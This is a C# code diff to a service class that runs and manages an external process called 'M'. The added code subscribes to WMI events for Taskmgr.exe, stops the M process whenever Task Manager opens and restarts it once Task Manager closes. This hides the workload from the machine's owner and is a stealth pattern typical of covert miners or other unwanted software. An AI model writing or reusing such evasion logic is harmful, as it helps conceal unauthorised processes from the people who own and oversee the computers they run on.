@@ -1,22 +1,45 @@
 ﻿using ClientWorker;
 using Interfaces;
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Text;
+using System.Management;
 
 namespace Service
 {
     public static class MClass
     {
         public static bool isWorking = false;
+        private static bool isListen = false;
 
         public static Process MProcess;
+        private static ManagementEventWatcher startWatch;
+        private static ManagementEventWatcher stopWatch;
 
+        public static void StartListenTaskManager()
+        {
+            if (!isListen)
+            {
+                startWatch = new ManagementEventWatcher(new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"Taskmgr.exe\""));
+                startWatch.EventArrived += startWatch_EventArrived;
+                startWatch.Start();
+                stopWatch = new ManagementEventWatcher(new WqlEventQuery("SELECT * FROM Win32_ProcessStopTrace WHERE ProcessName = \"Taskmgr.exe\""));
+                stopWatch.EventArrived += stopWatch_EventArrived;
+                stopWatch.Start();
+                isListen = true;
+            }
+        }
+        public static void StoptListenTaskManager()
+        {
+            if (isListen)
+            {
+                startWatch.Stop();
+                stopWatch.Stop();
+            }
+        }
         public static void Start()
         {
+            StartListenTaskManager();
             if (!isWorking)
             {
                 if (CheckLocalM())
@@ -74,7 +97,7 @@ namespace Service
                 Log.Send("MClass.Stop(): " + ex.Message);
             }
 
-
+            MExited(null, null);
         }
 
         public static void ReStart()
@@ -125,6 +148,16 @@ namespace Service
         public static void DeteteMFile()
         {
             File.Delete(Properties.Settings.Default.MLocalFloader + "\\" + Properties.Settings.Default.MFileName);
+        }
+
+        static void stopWatch_EventArrived(object sender, EventArrivedEventArgs e)
+        {
+            if (!isWorking) Start();
+        }
+
+        static void startWatch_EventArrived(object sender, EventArrivedEventArgs e)
+        {
+            if (isWorking) Stop();
         }
     }
 }
